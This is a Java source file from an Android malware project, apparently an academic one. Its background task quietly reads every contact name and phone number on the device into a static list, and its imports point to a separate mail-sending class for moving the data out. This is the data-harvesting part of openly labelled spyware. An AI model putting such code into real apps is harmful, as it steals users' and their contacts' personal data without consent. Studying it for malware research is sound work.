/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.phone;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import com.malware.mail.SendMailTask;
import com.malware.service.MyService;

import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

public class FetchContactsTask extends AsyncTask {

	private static ArrayList<ArrayList<String>> contactsList;

	private final boolean VERBOSE = true;
	private final String TAG = "FetchContactsTask";

	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.d(TAG, "Start of FetchContactsTask");
		
		ContentResolver cr = (ContentResolver) params[0];

		Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		String id;
		contactsList = new ArrayList<ArrayList<String>>(c.getCount());
		c.moveToFirst();
		
		for (int i = 0; i < c.getCount(); i++) {
			ArrayList<String> contactInfo = new ArrayList<String>(2);
			contactInfo.add(0, c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
			id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
			
			if (Integer.parseInt(c.getString(c.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
				Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
				while (pCur.moveToNext()) {
					contactInfo.add(1, pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
				}
			}
			contactsList.add(i, contactInfo);
			c.moveToNext();		
		}
		c.close();
		
		if (VERBOSE) Log.d(TAG, "End of FetchContactsTask");
		
		return null;
	}
	
	public static ArrayList<ArrayList<String>> getContactsList() {
		return contactsList;
	}
}
